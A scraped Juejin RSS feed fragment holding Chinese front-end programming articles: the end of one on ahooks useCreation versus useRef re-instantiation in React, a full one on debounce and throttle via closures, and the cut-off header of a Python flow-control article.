h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近在学习ahooks源码时，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fahooks.js.org%2Fzh-CN%2Fhooks%2Fuse-creation" target="_blank" title="https://ahooks.js.org/zh-CN/hooks/use-creation" ref="nofollow noopener noreferrer">useCreation</a>时，发现官方文档写了这样一句话</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b70e4c251d0a4d06aa342f709b111f9a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=%2FA5cQGm%2FBd%2BevL0JexOBkFm0Xv0%3D" alt="image.png" loading="lazy"/></p>
<p>第一眼后，我心想：useRef 不是只会执行一次吗？并且不会随组件生命周期变化吗？然后根据官方文档的例子试了一下，发现 useRef 在存储复杂数据类型时（比如对象），确实有性能问题</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"antd"</span>;
<span class="hljs-keyword">import</span> { useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Subject</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===constructor==="</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();
  }
  <span class="hljs-attr">data</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">RefQuestion</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">RefQuestion</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { current } = <span class="hljs-title function_">useRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Subject</span>());
  <span class="hljs-keyword">const</span> [, setFlag] = <span class="hljs-title function_">useState</span>({});
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"pt-10"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{current.data}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
        <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> {
          setFlag({});
        }}
      &gt;
        Rerender
      <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">RefQuestion</span>;
</code></pre>
<p>在上面的代码中，组件初始化时，会执行一次 <code>new Subject()</code>，控制台会打印一次 <code>===constructor===</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b792171f824047799cd042c99e3a7213~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=2Da7KxYhRJecArUBIJzqNARDCME%3D" alt="image.png" loading="lazy"/></p>
<p>当我点击按钮触发组件重新渲染时，虽然渲染的值没有变，但是控制台依旧打印了<code>===constructor===</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/038f6c0d4bd443359d963521ef4d81ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=MWyx9HvnMJXJyL0wDe5luu8Lzv8%3D" alt="image.png" loading="lazy"/></p>
<p>也就是说明：组件重新渲染时，虽然React内部判断后，返回了首次渲染时的值，<code>但是在每次组件渲染时，都会执行 new Subject() 实例化过程，即使每次实例化后，都丢弃了实例化对象</code>，而重复实例化对象就是一种<code>无效的内存开销</code>，即性能存在隐患</p>
<p>因此我重新看了下React文档对于 useRef 的说明：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2fa1ebe91464e6c95138a340ee862cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=xY34SjVqTcng75%2FTPsoYdPrsmzk%3D" alt="image.png" loading="lazy"/></p>
<p>可见 React 官方就已经对这种情况进行了说明，并且也给出了解决方案，思想与<code>单例模式</code>一致</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Video</span>(<span class="hljs-params"/>) {  
    <span class="hljs-keyword">const</span> playerRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);  
    <span class="hljs-keyword">if</span> (playerRef.<span class="hljs-property">current</span> === <span class="hljs-literal">null</span>) {  
        playerRef.<span class="hljs-property">current</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VideoPlayer</span>();  
    }  
    <span class="hljs-comment">// ...</span>
</code></pre>
<p>然后我们回过头来，可以看看 <a href="https://link.juejin.cn?target=https%3A%2F%2Fahooks.js.org%2Fzh-CN%2Fhooks%2Fuse-creation" target="_blank" title="https://ahooks.js.org/zh-CN/hooks/use-creation" ref="nofollow noopener noreferrer">useCreation</a> 是怎么做的</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">DependencyList</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> depsAreSame <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/depsAreSame'</span>;

<span class="hljs-keyword">const</span> useCreation = &lt;T&gt;<span class="hljs-function">(<span class="hljs-params">factory: () =&gt; T, deps: DependencyList</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> { current } = <span class="hljs-title function_">useRef</span>({
    deps,
    <span class="hljs-attr">obj</span>: <span class="hljs-literal">undefined</span> <span class="hljs-keyword">as</span> T,
    <span class="hljs-attr">initialized</span>: <span class="hljs-literal">false</span>,
  });
  <span class="hljs-keyword">if</span> (current.<span class="hljs-property">initialized</span> === <span class="hljs-literal">false</span> || !<span class="hljs-title function_">depsAreSame</span>(current.<span class="hljs-property">deps</span>, deps)) {
    current.<span class="hljs-property">deps</span> = deps;
    current.<span class="hljs-property">obj</span> = <span class="hljs-title function_">factory</span>();
    current.<span class="hljs-property">initialized</span> = <span class="hljs-literal">true</span>;
  }
  <span class="hljs-keyword">return</span> current.<span class="hljs-property">obj</span>;
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useCreation;
</code></pre>
<ul>
<li>如果是首次渲染（<code>initialized === false</code>）或者 依赖项发生了改变（<code>!depsAreSame(current.deps, deps)</code>），则执行 <code>factory()</code>函数创建值</li>
<li>如果不满足条件，直接返回之前的值（<code>此时不会走 factory()</code>）</li>
</ul>
<p>这样就保证了通过 useCreation 创建的值一定是 memosized，依赖改变前是保证不会重新计算的</p>
<p>我们将 useCreation 代替 useRef 试试</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { useCreation } <span class="hljs-keyword">from</span> <span class="hljs-string">"ahooks"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"antd"</span>;
<span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Subject</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===constrcutor====="</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();
  }
  <span class="hljs-attr">data</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">RefQuestion</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">RefQuestion</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [flag, setFlag] = <span class="hljs-title function_">useState</span>({});
  <span class="hljs-keyword">const</span> foo = <span class="hljs-title function_">useCreation</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Subject</span>(), []);
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"pt-10"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{foo.data}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
        <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> {
          setFlag({});
        }}
      &gt;
        Rerender
      <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">RefQuestion</span>;
</code></pre>
<p>点击按钮，组件重新渲染，不会执行 new Subject() 的实例化过程</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e1181a6b21c418cb0e485c27047d9ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=vUNJsNePjjK5sczsj2qyIuoJIxY%3D" alt="image.png" loading="lazy"/></p>
<p>那如果依赖发生改变，每次也只会重新计算一次</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { useCreation } <span class="hljs-keyword">from</span> <span class="hljs-string">"ahooks"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"antd"</span>;
<span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Subject</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===constrcutor====="</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();
  }
  <span class="hljs-attr">data</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">RefQuestion</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">RefQuestion</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [flag, setFlag] = <span class="hljs-title function_">useState</span>({});
  <span class="hljs-keyword">const</span> foo = <span class="hljs-title function_">useCreation</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Subject</span>(), [flag]);
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"pt-10"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{foo.data}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
        <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> {
          setFlag({});
        }}
      &gt;
        Rerender
      <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">RefQuestion</span>;
</code></pre>
<p>如图，我点击了八次按钮，依赖改变了八次</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62722c74b4224a328181f072ead8eda8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=ghAu0BYpwmF%2BLI0SbFCNLeT800A%3D" alt="image.png" loading="lazy"/></p>
<p>所以，useRef并不是只会执行一次，而是每次组件渲染都执行，只不过如果之前有结果就返回之前的结果而已。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[防抖与节流：用闭包驯服高频事件的性能利器]]></title>    <link>https://juejin.cn/post/7594051966890229795</link>    <guid>https://juejin.cn/post/7594051966890229795</guid>    <pubDate>2026-01-12T12:21:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594051966890229795" data-draft-id="7592382702944157742" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="防抖与节流：用闭包驯服高频事件的性能利器"/> <meta itemprop="keywords" content="React.js"/> <meta itemprop="datePublished" content="2026-01-12T12:21:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Zyx2007"/> <meta itemprop="url" content="https://juejin.cn/user/3924597867554890"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            防抖与节流：用闭包驯服高频事件的性能利器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3924597867554890/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Zyx2007
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T12:21:59.000Z" title="Mon Jan 12 2026 12:21:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Web 应用中，用户交互无处不在——输入搜索、滚动页面、窗口缩放、按钮点击……这些操作往往触发高频事件，若不加控制，轻则浪费网络资源，重则导致页面卡顿甚至崩溃。<strong>防抖（Debounce）与节流（Throttle）</strong> 正是解决此类问题的经典方案。它们利用 JavaScript 的闭包机制，在不改变业务逻辑的前提下，智能调控函数执行频率，既保障用户体验，又提升系统性能。</p>
<h2 data-id="heading-0">问题根源：高频事件的代价</h2>
<p>以搜索框为例，每当用户敲击键盘，<code>keyup</code> 事件就会被触发。若每次按键都立即发起 AJAX 请求获取建议词：</p>
<pre><code class="hljs language-javascript" lang="javascript">input.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'keyup'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-title function_">ajax</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>);
});
</code></pre>
<p>那么输入“JavaScript”将触发 10 次请求。不仅服务器压力剧增，前端也可能因响应顺序错乱而展示错误结果。类似问题也出现在滚动监听、窗口 resize、表单提交等场景。<strong>我们需要的不是“实时”，而是“适时”</strong> 。</p>
<h2 data-id="heading-1">防抖：只响应最后一次操作</h2>
<p>防抖的核心思想是：<strong>在连续触发事件时，仅在最后一次操作后等待指定时间，才执行回调</strong>。这就像电梯门——有人不断进出，门就一直不关；直到最后一个人进入并等待几秒，门才关闭。</p>
<p>其实现依赖闭包保存定时器 ID：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">fn, delay</span>) {
  <span class="hljs-keyword">let</span> timer = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">...args</span>) {
    <span class="hljs-keyword">if</span> (timer) <span class="hljs-built_in">clearTimeout</span>(timer);
    timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args), delay);
  };
}
</code></pre>
<p><code>timer</code> 作为自由变量被返回函数捕获。每次事件触发，先清除旧定时器，再启动新倒计时。只有当用户停止输入超过 <code>delay</code> 毫秒，<code>fn</code> 才真正执行。这完美适用于搜索建议、自动保存等场景。</p>
<h2 data-id="heading-2">节流：按固定节奏响应</h2>
<p>节流则采取不同策略：<strong>无论事件触发多频繁，保证在指定时间间隔内最多执行一次</strong>。如同机关枪的射速限制——即使扣住扳机不放，子弹也按固定频率射出。</p>
<p>一种常见实现如下：</p>
<pre><code class="hljs language-ini" lang="ini">function throttle(fn, delay) {
  let <span class="hljs-attr">last</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
  return function (...args) {
    const <span class="hljs-attr">now</span> = Date.now()<span class="hljs-comment">;</span>
    if (now - last &gt;= delay) {
      <span class="hljs-attr">last</span> = now<span class="hljs-comment">;</span>
      fn.apply(this, args)<span class="hljs-comment">;</span>
    }
  }<span class="hljs-comment">;</span>
}
</code></pre>
<p>通过记录上次执行时间 <code>last</code>，确保两次调用间隔不少于 <code>delay</code>。这种“匀速执行”模式特别适合处理滚动、拖拽、鼠标移动等持续性事件。例如判断是否滑到底部加载更多内容，无需每像素都检测，每 200ms 检查一次足矣。</p>
<h2 data-id="heading-3">闭包：隐藏状态的魔法容器</h2>
<p>无论是防抖还是节流，其核心都依赖 <strong>闭包</strong> 来维护内部状态（<code>timer</code> 或 <code>last</code>）。这些变量对外部不可见，却能在多次函数调用间持久存在，形成私有记忆。这不仅避免了全局污染，也保证了多个防抖/节流实例互不干扰。</p>
<p>例如，可为不同输入框创建独立的防抖函数：</p>
<pre><code class="hljs language-scss" lang="scss">const searchDebounce = <span class="hljs-built_in">debounce</span>(ajax, <span class="hljs-number">500</span>);
const saveDebounce = <span class="hljs-built_in">debounce</span>(saveDraft, <span class="hljs-number">1000</span>);

searchInput<span class="hljs-selector-class">.addEventListener</span>('input', (e) =&gt; <span class="hljs-built_in">searchDebounce</span>(e.target.value));
<span class="hljs-selector-tag">textarea</span><span class="hljs-selector-class">.addEventListener</span>('input', (e) =&gt; <span class="hljs-built_in">saveDebounce</span>(e.target.value));
</code></pre>
<p>每个实例拥有自己的 <code>timer</code>，互不影响。</p>
<h2 data-id="heading-4">实际应用场景对比</h2>



































<table><thead><tr><th>场景</th><th>推荐策略</th><th>原因说明</th></tr></thead><tbody><tr><td>搜索框建议</td><td>防抖</td><td>用户输入具有连续性，只需最终结果</td></tr><tr><td>表单自动保存</td><td>防抖</td><td>避免频繁写入，待用户停顿时保存</td></tr><tr><td>窗口 resize 布局调整</td><td>节流</td><td>需要持续响应，但不必每帧都计算</td></tr><tr><td>滚动加载</td><td>节流</td><td>定期检查位置，防止过度触发</td></tr><tr><td>按钮防重复点击</td><td>防抖</td><td>点击后锁定一段时间，防止误操作</td></tr></tbody></table>
<h2 data-id="heading-5">性能与体验的平衡艺术</h2>
<p>防抖与节流并非越“狠”越好。延迟时间需根据具体场景权衡：</p>
<ul>
<li>搜索建议若设为 1000ms，用户会感到迟钝；</li>
<li>滚动节流若设为 10ms，则失去优化意义。</li>
</ul>
<p>通常，<strong>防抖延迟取 300–500ms，节流间隔取 100–200ms</strong> 是较合理的起点，再结合用户反馈微调。</p>
<h2 data-id="heading-6">与现代框架的融合</h2>
<p>在 React 中，常配合 <code>useCallback</code> 和 <code>useRef</code> 使用防抖/节流，避免每次渲染重建函数：</p>
<pre><code class="hljs language-scss" lang="scss">const handleSearch = <span class="hljs-built_in">useCallback</span>(
  debounce((value) =&gt; <span class="hljs-built_in">fetchSuggestions</span>(value), <span class="hljs-number">400</span>),
  <span class="hljs-selector-attr">[]</span>
);
</code></pre>
<p>而在 Vue 中，可将其封装为自定义指令或组合式函数，实现声明式调用。
防抖与节流虽是基础技巧，却是高性能前端开发的基石。它们以极小的代码成本，换取显著的性能收益，体现了“少即是多”的工程智慧。而闭包作为其实现的核心机制，再次证明了 JavaScript 函数式特性的强大。掌握这两项技术，不仅能写出更流畅的应用，更能培养对事件流与资源消耗的敏感度——这正是优秀开发者的关键素养。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[流程控制进阶：从闰年判断到猜数游戏的逻辑复盘与代码实现]]></title>    <link>https://juejin.cn/post/7594303825013227535</link>    <guid>https://juejin.cn/post/7594303825013227535</guid>    <pubDate>2026-01-12T15:52:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594303825013227535" data-draft-id="7594303923361644584" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="流程控制进阶：从闰年判断到猜数游戏的逻辑复盘与代码实现"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-12T15:52:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="love_summer"/> <meta itemprop="url" content="https://juejin.cn/user/1462819851084228"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            流程控制进阶：从闰年判断到猜数游戏的逻辑复盘与代码实现
